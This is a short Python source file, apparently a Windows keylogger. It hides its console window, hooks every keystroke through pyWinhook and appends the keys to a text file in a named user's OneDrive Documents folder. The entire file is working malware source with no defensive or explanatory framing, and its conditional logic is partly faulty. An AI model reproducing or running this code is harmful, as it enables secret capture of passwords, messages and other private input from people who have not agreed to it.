import win32api
import win32console
import win32gui
import pythoncom
import pyWinhook as pyHook
import os


win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):
    file_path = 'C:\\'
    directory_path = os.path.dirname(file_path)
    if event.Ascii == 5:
        exit(1)
    if event.Ascii != 0 or event.Ascii != 8:
        # open output.txt to read current keystrokes
        with open('C:\\Users\\jihad\\OneDrive\\Dokumentuak\\output.txt', 'r+') as f:
            buffer = f.read()
            f.close()

        # open output.txt to write current + new keystrokes
        with open('C:\\Users\\jihad\\OneDrive\\Dokumentuak\\output.txt', 'w') as f:
            keylogs = chr(event.Ascii)
            if event.Ascii == 13:
                keylogs = '\n'
            buffer += keylogs
            f.write(buffer)
            f.close()


# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent

# set the hook
hm.HookKeyboard()

# wait forever
pythoncom.PumpMessages()
